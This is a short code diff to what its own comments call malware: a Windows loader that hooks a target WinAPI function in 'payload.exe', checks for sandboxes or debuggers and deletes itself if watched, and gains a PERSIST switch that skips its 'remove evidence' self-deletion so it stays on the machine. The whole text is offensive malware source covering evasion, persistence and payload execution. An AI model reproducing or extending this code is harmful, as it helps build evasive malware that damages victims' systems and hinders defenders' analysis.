@@ -5,6 +5,8 @@
 #include "utils/headers/Tools.h"
 
 #define WIN32_LEAN_AND_MEAN
+#define PERSIST // We want the malware to persist, so it won't be nuked upon execution
+
 //#define TARGET_FUNC	"WriteFile"
 //#define TARGET_DLL	"Kernel32"
 
@@ -13,7 +15,7 @@
 
 // These should be encrypted
 char const*	TARGET_FUNC = "MessageBoxA"; // Replace with target winapi function
-const char* TARGET_DLL  = "USER32";		 // Replace with target winapi functions corresponding DLL
+const char* TARGET_DLL  = "User32";		 // Replace with target winapi functions corresponding DLL
 const char* TARGET_EXE  = "payload.exe"; // Replace with the binary to target
 
 
@@ -46,7 +48,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	
 	//hide.DelayExecution(5, resolver);				      // wait 5 minutes before execution
 
-
 	do
 	{
 		hide.IsBeingWatched(resolver);				  // Nuke self if in sandbox or debugger
@@ -63,7 +64,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	Payload(process, api, TARGET_DLL, (char*)TARGET_FUNC);// Execute the payloads constructor
 	
-	hide.Nuke(resolver);								  // Remove evidence
+#ifndef PERSIST
+	hide.Nuke(resolver);
+#endif // PERSIST
+
 	return 0;
 } 
 
